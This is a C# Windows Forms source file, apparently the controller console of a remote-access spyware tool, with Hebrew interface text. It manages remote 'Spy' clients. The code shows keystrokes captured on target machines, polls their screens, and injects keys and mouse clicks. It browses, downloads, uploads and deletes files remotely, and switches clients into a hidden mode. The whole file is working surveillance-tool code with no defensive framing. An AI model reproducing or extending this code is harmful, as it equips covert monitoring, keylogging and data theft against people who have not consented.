using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using Both;

namespace Control
{
    public partial class FormControl : Form
    {
        //--Data--
        //All
        public UserAPI userAPI;
        public Thread readKeyStart;

        //Properties
        public bool NameIP = true;//f - Name, t - IP

        //Spys
        public List<SpyControl> Spys;
        public SpyControl selectSpy = null;
        public SpyControl SelectSpy
        {
            get
            {
                return selectSpy;
            }
            set
            {
                selectSpy = value;
                if (selectSpy != null)
                {
                    LabelNameComputer.Text = selectSpy.Data.Name;
                    LabelIP.Text = selectSpy.Data.IP;
                    BoxHide.SelectedIndex = (selectSpy.Data.Hide) ? 1 : 0;
                    LabelConnectTime.Text = (selectSpy.Data.StartConnect == null) ? "null" : selectSpy.Data.StartConnect + "";
                    TrackBarVolume.Visible = true;
                    RadioBarVolumeLevel.Visible = true;
                    RadioBarVolumeSound.Visible = true;
                }
                else
                {
                    LabelNameComputer.Text = "null";
                    LabelIP.Text = "null";
                    LabelConnectTime.Text = "null";
                    WindowClear();
                }
            }
        }
        public SpyControl ThisComputer;

        //All
        public FormControl()
        {
            InitializeComponent();
        }

        private void FormControl_Load(object sender, EventArgs e)
        {
            Strings.Images = Application.StartupPath + @"\Images";
            Directory.CreateDirectory(Strings.Images);
            Strings.ImagesIcon = Strings.Images + @"\IconFile";
            Directory.CreateDirectory(Strings.ImagesIcon);
            Strings.Dounlod = Application.StartupPath + @"\Dounlod";
            Directory.CreateDirectory(Strings.Dounlod);
            ListFileView = new List<FileView>();
            ByteArray.Length = Net.MaxByte;
            LabelError.Text = "";
            WindowClear(true);
            SpyControl.LoadImages(WindowNotConnected, IconVolumeOpen, IconVolumeClose);
            Spys = new List<SpyControl>();
            BoxHide.SelectedIndex = 0;
            userAPI = new UserAPI();
            userAPI.ReadKeyShange(BoxWindow_SetKey);
            readKeyStart = new Thread(userAPI.ReadKeyStart);
            readKeyStart.Start();
        }
        private void FormControl_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var item in Spys)
            {
                DisconnectSpy(item);
            }
            Spys.Clear();
            readKeyStart.Abort();
        }

        //Spys
        private void buttonConnect_Click(object sender, EventArgs e)
        {
            string IP = BoxConnect.Text;
            if (!NameIP)
                IP = Net.NameToIP(IP);
            bool IsThisComputer = (IP == "127.0.0.1" || IP == Net.NameToIP(Net.NameComputer));
            if (IsThisComputer && ThisComputer != null)
            {
                LabelError.Text = "מחשב זה כבר מחובר";
                return;
            }
            foreach (var item in Spys)
            {
                if (IP == item.Data.IP)
                {
                    LabelError.Text = "מחשב זה כבר מחובר";
                    return;
                }
            }
            bool Good;
            SpyControl spy = new SpyControl(IP, this, out Good);
            if (!Good)
                return;
            Spys.Add(spy);
            spy.ClickSelect = SpySelect;
            spy.Index = Spys.Count - 1;
            spy.ReadServer = ReadServer;
            spy.Start();
            if (IsThisComputer)
            {
                ThisComputer = spy;
            }
        }
        private void BoxSelectAll_CheckedChanged(object sender, EventArgs e)
        {
            foreach (var item in Spys)
            {
                item.Select = BoxSelectAll.Checked;
            }
        }
        private void SpySelect(object sender)
        {
            SpyControl spy = (SpyControl)sender;
            if (spy.Select)
            {
                if (SelectSpy != null)
                {
                    SelectSpy.Bord.BackColor = Color.Red;
                }
                SelectSpy = spy;
                SelectSpy.Bord.BackColor = Color.Green;
            }
            else
            {
                if (spy == SelectSpy)
                {
                    spy.Select = true;
                }
            }
        }
        public void ReadServer(object sender, byte[] array)
        {
            SpyControl Spy = (SpyControl)sender;
            ByteArray commend = new ByteArray(array);
            string hard = commend.ReadString();
            switch (hard)
            {
                case "SC"://Set ~Connect
                    {
                        bool good = (commend.ReadChar() == 'T');
                        if (!good)
                        {
                            DisconnectSpy(Spy, false, 'T');
                            LabelError.Text = "This spy have \"Control\"";
                        }
                        else
                        {
                            Spy.Data.Name = commend.ReadString();
                            Spy.Data.StartConnect = commend.ReadTime();
                            Spy.Data.IP = Net.NameToIP(Spy.Data.Name);
                            Spy.Data.Hide = (commend.ReadChar() == 'T');
                            Spy.Data.VolumeMute = (commend.ReadChar() == 'T');
                            Spy.Data.VolumeLevel = commend.ReadInt();
                            Spy.UpdateIP();
                            Spy.UpdateVolume();
                            if (SelectSpy == Spy)
                                SelectSpy = Spy;
                        }
                    }
                    break;
                case "SD"://~Data
                    {
                        bool good = (commend.ReadChar() == 'T');
                        if (!good)
                        {
                            LabelError.Text = "תקייה לא קיימת";
                        }
                        else
                        {
                            string[] folders = new string[commend.ReadInt()];
                            for (int i = 0; i < folders.Length; i++)
                            {
                                folders[i] = commend.ReadString();
                            }
                            string[] files = new string[commend.ReadInt()];
                            for (int i = 0; i < files.Length; i++)
                            {
                                files[i] = commend.ReadString();
                            }
                            FilesUpdate(folders, files);
                        }
                    }
                    break;
                case "SV"://~Volume Shange
                    {
                        Spy.Data.VolumeMute = (commend.ReadChar() == 'T');
                        Spy.UpdateVolume();
                    }
                    break;
                case "SVA"://~All
                    {
                        Spy.Data.VolumeLevel = commend.ReadInt();
                        int volume = commend.ReadInt();
                        if (RadioBarVolumeLevel.Checked)
                        {
                            TrackBarVolume.Enabled = true;
                            volume = Spy.Data.VolumeLevel;
                        }
                        else
                        {
                            TrackBarVolume.Enabled = false;
                        }
                        TrackBarVolume.Value = volume;
                        toolTipNameIP.SetToolTip(TrackBarVolume, volume + "");
                    }
                    break;
                case "K"://Key Read
                    {
                        int key = commend.ReadInt();
                        UserAPI.DataKey dataKey = new UserAPI.DataKey();
                        dataKey.LockNum = (commend.ReadChar() == 'T');
                        if (Spy == selectSpy)
                        {
                            LabelKeyRead.Text = UserAPI.KeyToText((Keys)key, dataKey);
                        }
                    }
                    break;
                case "L"://Loop
                    {
                        Loop(sender, commend);
                    }
                    break;
                case "F"://File Download
                    {
                        string Title = commend.ReadString();
                        byte[] All = commend.ReadByteArray();
                        string url = Strings.Dounlod + @"\" + Title;
                        FileInfo f = new FileInfo(url);
                        Directory.CreateDirectory(f.DirectoryName);
                        File.WriteAllBytes(url, All);
                    }
                    break;
            }
        }
        public void Loop(object sender, ByteArray commend)
        {
            SpyControl Spy = (SpyControl)sender;
            byte[] bytes = commend.ReadByteArray();
            MemoryStream memoryStream = new MemoryStream(bytes, 0, bytes.Length);
            Bitmap read = null;
            try
            {
                read = new Bitmap(memoryStream, true);
                Spy.SetImage(read);
            }
            catch { }
            if (Spy == selectSpy)
            {
                if (read != null)
                {
                    var bitmap = new Bitmap(read, BoxWindow.Size);
                    if (bitmap.Size.Height > 0)
                        BoxWindow.Image = bitmap;
                }
            }
        }
        public bool ClearFromList = true;
        public void DisconnectSpy(SpyControl spy)
        {
            ClearFromList = false;
            DisconnectSpy(spy, false);
        }
        public void DisconnectSpy(SpyControl spy, bool Exit, char NotGood = 'F')
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write("E" + ((!Exit) ? "D" : ""));
            if (!Exit)
                byteArray.Write(NotGood);
            spy.client.Write(byteArray.Values);
            if (ClearFromList)
            {
                Spys.Remove(spy);
                TableSpys.Controls.RemoveAt(spy.Index);
            }
            ClearFromList = true;
            spy.client.Disconnect();
            if (spy == SelectSpy)
                SelectSpy = null;
            if (spy == ThisComputer)
                ThisComputer = null;
        }

        //--Body--
        private int TabPageIndexLast = 0;
        private void PageTabs_Selected(object sender, TabControlEventArgs e)
        {
            if (e.TabPageIndex == 1)
            {
                TimerWindow.Start();
            }
            else if (TabPageIndexLast == 1)
            {
                TimerWindow.Stop();
            }
            TabPageIndexLast = e.TabPageIndex;
        }

        //Main
        private void buttonDisconnect_Click(object sender, EventArgs e)
        {
            bool Exit = ((Button)sender != buttonDisconnect);
            for (int i = 0; i < Spys.Count; i++)
            {
                var item = Spys[i];
                if (item.Select)
                {
                    DisconnectSpy(item, Exit);
                }
            }
        }

        //Window
        public Bitmap WindowNotConnected, IconOpen, IconClose, IconMove, IconRightClick, IconLeftClick, IconVolumeOpen, IconVolumeClose;
        private bool windowON = false, doubleClickOpen = true, setKeyOpen = true;
        private bool trackBarVolumeShange = false;
        private Bitmap VolumeOpen(bool value)
        {
            if (value)
            {
                return IconVolumeOpen;
            }
            else
            {
                return IconVolumeClose;
            }
        }
        private bool DoubleClickOpen
        {
            get
            {
                return doubleClickOpen;
            }
            set
            {
                doubleClickOpen = value;
                if (doubleClickOpen)
                {
                    MenuStripWindow_DoubleClickOpen.Image = IconOpen;
                }
                else
                {
                    MenuStripWindow_DoubleClickOpen.Image = IconClose;
                }
            }
        }
        private bool SetKeyOpen
        {
            get
            {
                return setKeyOpen;
            }
            set
            {
                setKeyOpen = value;
                if (setKeyOpen)
                {
                    MenuStripWindow_SetKeyOpen.Image = IconOpen;
                }
                else
                {
                    MenuStripWindow_SetKeyOpen.Image = IconClose;
                }
            }
        }
        private void WindowClear(bool start = false)
        {
            if (start)
            {
                WindowNotConnected = new Bitmap(Strings.Images + @"\NotConnected.jpg");
                IconOpen = new Bitmap(Strings.Images + @"\MenuStripIcons\Open.jpg");
                IconClose = new Bitmap(Strings.Images + @"\MenuStripIcons\Close.jpg");
                IconMove = new Bitmap(Strings.Images + @"\MenuStripIcons\Move.jpg");
                IconLeftClick = new Bitmap(Strings.Images + @"\MenuStripIcons\Left Click.jpg");
                IconRightClick = new Bitmap(Strings.Images + @"\MenuStripIcons\Right Click.jpg");
                IconVolumeOpen = new Bitmap(Strings.Images + @"\MenuStripIcons\‏‏VolumeOpen.jpg");
                IconVolumeClose = new Bitmap(Strings.Images + @"\MenuStripIcons\‏‏VolumeClose.jpg");
                DoubleClickOpen = doubleClickOpen;
                SetKeyOpen = setKeyOpen;
                MenuStripWindow_SetMouse.Image = IconMove;
                MenuStripWindow_LeftClick.Image = IconLeftClick;
                MenuStripWindow_RightClick.Image = IconRightClick;
                LabelKeyRead.Text = "null";
            }
            BoxWindow.Image = WindowNotConnected;
            TrackBarVolume.Visible = false;
            RadioBarVolumeLevel.Visible = false;
            RadioBarVolumeSound.Visible = false;
        }

        private void BoxWindow_MouseLeave(object sender, EventArgs e)
        {
            windowON = false;
        }
        private void BoxWindow_MouseClick(object sender, MouseEventArgs e)
        {
            windowON = true;
        }
        private void BoxWindow_DoubleClick(object sender, MouseEventArgs e)
        {
            if (windowON && DoubleClickOpen)
            {
                MenuStripWindow_LeftClick_Click(sender, new EventArgs());
            }
        }
        private void BoxWindow_SetKey(Keys key)
        {
            if (selectSpy != null && windowON)
            {
                if (key == Keys.RButton || key == Keys.LButton)
                    return;
                ByteArray byteArray = new ByteArray();
                byteArray.Write("KK");
                byteArray.Write((int)key);
                selectSpy.client.Write(byteArray.Values);
            }
        }
        private void TrackBarVolume_MouseUp(object sender, MouseEventArgs e)
        {
            if (SelectSpy == null || RadioBarVolumeSound.Checked)
                return;
            int level = TrackBarVolume.Value;
            ByteArray byteArray = new ByteArray();
            byteArray.Write("VL");
            byteArray.Write(level);
            selectSpy.client.Write(byteArray.Values);
            trackBarVolumeShange = false;
        }
        private void TrackBarVolume_MouseDown(object sender, MouseEventArgs e)
        {
            trackBarVolumeShange = true;
        }
        private void RadioBarVolume_CheckedChanged(object sender, EventArgs e)
        {
            if (((RadioButton)sender).Checked == true)
                return;
            bool IsLevel = !RadioBarVolumeLevel.Checked;
            TrackBarVolume.Enabled = !IsLevel;
            if (IsLevel)
            {
                TrackBarVolume.Value = selectSpy.Data.VolumeLevel;
            }
        }
        private void LabelKeyRead_Click(object sender, EventArgs e)
        {
            if (LabelKeyRead.Font.Bold)
            {
                LabelKeyRead.Font = null;
            }
            else
            {
                LabelKeyRead.Font = new Font("Microsoft Sans Serif", 15.75F, FontStyle.Bold, GraphicsUnit.Point, 177);
            }
        }
        private void TimerWindow_Tick(object sender, EventArgs e)
        {
            if (selectSpy == null)
                return;
            ByteArray byteArray = new ByteArray();
            byteArray.Write("L");
            selectSpy.client.Write(byteArray.Values);
        }

        private void MenuStripWindow_Opening(object sender, CancelEventArgs e)
        {
            if (SelectSpy == null)
            {
                e.Cancel = true;
                return;
            }
            MenuStripWindow_Volume.Image = VolumeOpen(selectSpy.Data.VolumeMute);
        }
        private void MenuStripWindow_SetMouse_Click(object sender, EventArgs e)
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write("KM");
            byteArray.Write(0);//x
            byteArray.Write(0);//y
            selectSpy.client.Write(byteArray.Values);
        }
        private void MenuStripWindow_LeftClick_Click(object sender, EventArgs e)
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write("KK");
            byteArray.Write((int)Keys.LButton);
            selectSpy.client.Write(byteArray.Values);
        }
        private void MenuStripWindow_RightClick_Click(object sender, EventArgs e)
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write("KK");
            byteArray.Write((int)Keys.RButton);
            selectSpy.client.Write(byteArray.Values);
        }
        private void MenuStripWindow_Volume_Click(object sender, EventArgs e)
        {
            selectSpy.VolumeMuteClick(sender, e);
        }
        private void MenuStripWindow_DoubleClickOpen_Click(object sender, EventArgs e)
        {
            DoubleClickOpen = !DoubleClickOpen;
        }
        private void MenuStripWindow_SetKeyOpen_Click(object sender, EventArgs e)
        {
            SetKeyOpen = !SetKeyOpen;
        }

        //Properties
        private string BoxHideLast = "";
        private void BoxHide_TextChanged(object sender, EventArgs e)
        {
            if (BoxHide.Items.IndexOf(BoxHide.Text) == -1)
            {
                BoxHide.Text = BoxHideLast;
            }
            else
            {
                BoxHideLast = BoxHide.Text;
            }
        }
        private void BoxHide_Shange(object sender, EventArgs e)
        {
            ByteArray byteArray = new ByteArray();
            bool hide = (BoxHide.SelectedIndex == 0);
            byteArray.Write("H");
            byteArray.Write(BoxHide.SelectedIndex);
            foreach (var spy in Spys)
            {
                if (spy.Select)
                {
                    spy.client.Write(byteArray.Values);
                    spy.Data.Hide = hide;
                }
            }
        }
        private void buttonIconOfFiles_Click(object sender, EventArgs e)
        {
            FormIconOfFile open = new FormIconOfFile(Strings.ImagesIcon, Strings.Images + @"\File.jpg");
            open.ShowDialog();
        }
        private void buttonIPOrName_Click(object sender, EventArgs e)
        {
            NameIP = !NameIP;
            foreach (var item in Spys)
            {
                item.UpdateIP();
            }
            if (NameIP)
            {
                toolTipNameIP.SetToolTip(BoxConnect, "IP");
                buttonIPOrName.Text = "IP";
            }
            else
            {
                toolTipNameIP.SetToolTip(BoxConnect, "Name");
                buttonIPOrName.Text = "Name";
            }
        }

        //Files
        public List<FileView> ListFileView;
        public void Files_UpdateView()
        {
            FilesShange(BoxUrlFolder.Tag + "");
        }
        public void FilesShange(string folder)
        {
            Text = "" + folder[folder.Length - 1];
            if (folder[folder.Length - 1] + "" != @"\")
                folder += @"\";
            BoxUrlFolder.Tag = folder;
            BoxUrlFolder.Text = folder;
            ByteArray commend = new ByteArray();
            commend.Write("GD");
            commend.Write(folder);
            SelectSpy.client.Write(commend.Values);
        }
        public void FilesUpdate(string[] folders, string[] files)
        {
            FilesClear();
            LabelFolderSelect.Text = folders.Length + "";
            foreach (var item in folders)
            {
                var add = new FileView(this, item, true);
                add.FolderOpen = FolderOpen;
                ListFileView.Add(add);
            }
            LabelFileSelect.Text = files.Length + "";
            foreach (var item in files)
            {
                var add = new FileView(this, item, false);
                ListFileView.Add(add);
            }
        }
        public void FilesClear()
        {
            ViewFiles.Controls.Clear();
            LabelFolderSelect.Text = "0";
            LabelFileSelect.Text = "0";
            ListFileView.Clear();
        }
        private void buttonShangeFolder_Click(object sender, EventArgs e)
        {
            if (SelectSpy == null)
            {
                LabelError.Text = "לא נבחר מחשב";
                return;
            }
            string folder = BoxUrlFolder.Text;
            FilesShange(folder);
        }
        private void buttonFolderUpdate_Click(object sender, EventArgs e)
        {
            if (SelectSpy == null || BoxUrlFolder.Text == "")
            {
                FilesClear();
            }
            else
            {
                FilesShange(BoxUrlFolder.Tag + "");
            }
        }
        public void FolderOpen(object sender)
        {
            try
            {
                FileView folder = (FileView)sender;
                FilesShange(BoxUrlFolder.Tag + folder.NameFile.Text);
            }
            catch { }
        }

        private void MenuStripFiles_Opening(object sender, CancelEventArgs e)
        {
            if (SelectSpy == null)
            {
                Close();
                return;
            }
            if (FileView.SelectMenu != null)
            {
                var fileView = FileView.SelectMenu;
                Menu_Files_FolderLine.Visible = fileView.IsFolder;
                Menu_Files_OpenFolder.Visible = fileView.IsFolder;
            }
        }

        private void MenuStripFiles_SelectAlI_Click(object sender, EventArgs e)
        {
            foreach (var item in ListFileView)
            {
                item.Select = true;
            }
        }
        private void MenuStripFiles_SelectAlI_CancelAll_Click(object sender, EventArgs e)
        {
            foreach (var item in ListFileView)
            {
                item.Select = false;
            }
        }
        private void MenuStripFiles_Delet_Click(object sender, EventArgs e)
        {
            Tool_FilesVoid('D');
        }
        private void MenuStripFiles_Dounlod_Click(object sender, EventArgs e)
        {
            Tool_FilesVoid('G');
        }
        private void MenuStripFiles_Copy_Click(object sender, EventArgs e)
        {
            string text = (new FormReadText().Send("בחר תקייה"));
            Tool_FilesVoid('C', text);
        }
        private void MenuStripFiles_OpenFolder_Click(object sender, EventArgs e)
        {
            var fileView = FileView.SelectMenu;
            FolderOpen(fileView);
        }
        private void MenuStripFiles_NewFolder_Click(object sender, EventArgs e)
        {
            string Name = (new FormReadText().Send("צור תקייה"));
            if (Name == "")
                return;
            ByteArray byteArray = new ByteArray();
            byteArray.Write("AN");
            byteArray.Write(BoxUrlFolder.Tag + @"\"+ Name);
            SelectSpy.client.Write(byteArray.Values);
            Thread.Sleep(100);
            Files_UpdateView();
        }
        private void MenuStripFiles_SetFiles_Click(object sender, EventArgs e)
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write("AS");
            OpenFileDialog open = new OpenFileDialog();
            open.Multiselect = true;
            if (open.ShowDialog() != DialogResult.OK)
                return;
            byteArray.Write(BoxUrlFolder.Tag + "");
            string[] files = open.FileNames;
            open.Dispose();
            byteArray.Write(0);
            byteArray.Write(files.Length);
            for (int i = 0; i < files.Length; i++)
            {
                string name = (new FileInfo(files[i])).Name;
                byte[] bytes = File.ReadAllBytes(files[i]);
                byteArray.Write(name);
                try
                {
                    byteArray.Write(bytes, true);
                }
                catch (Exception ex)
                {
                    int size = 0;
                    foreach (var item in files)
                    {
                        size += File.ReadAllBytes(item).Length;
                    }
                    size /= 10000;
                    double sizeD = size;
                    sizeD /= 100;
                    LabelError.Text = "(" + sizeD + "MegaByte) עודף מידע";
                    return;
                }
            }
            SelectSpy.client.Write(byteArray.Values);
            Files_UpdateView();
        }

        private void Tool_FilesVoid(char type, string UrlTo = null)
        {
            ByteArray byteArray = new ByteArray();
            byteArray.Write('F');
            byteArray.Write(type);
            List<string> folders = new List<string>();
            List<string> files = new List<string>();
            bool HaveItem = false;
            foreach (var item in ListFileView)
            {
                if (item.Select)
                {
                    HaveItem = true;
                    if (item.IsFolder)
                    {
                        folders.Add(item.Url);
                    }
                    else
                    {
                        files.Add(item.Url);
                    }
                }
            }
            if (!HaveItem)
            {
                LabelError.Text = "לא נבחר פריט";
                return;
            }
            byteArray.Write(folders.Count);
            foreach (var item in folders)
            {
                byteArray.Write(item);
            }
            byteArray.Write(files.Count);
            foreach (var item in files)
            {
                byteArray.Write(item);
            }
            if (UrlTo != null)
                byteArray.Write(UrlTo);
            SelectSpy.client.Write(byteArray.Values);
            Files_UpdateView();
        }
    }

    public delegate void EventSender(object sender);
}
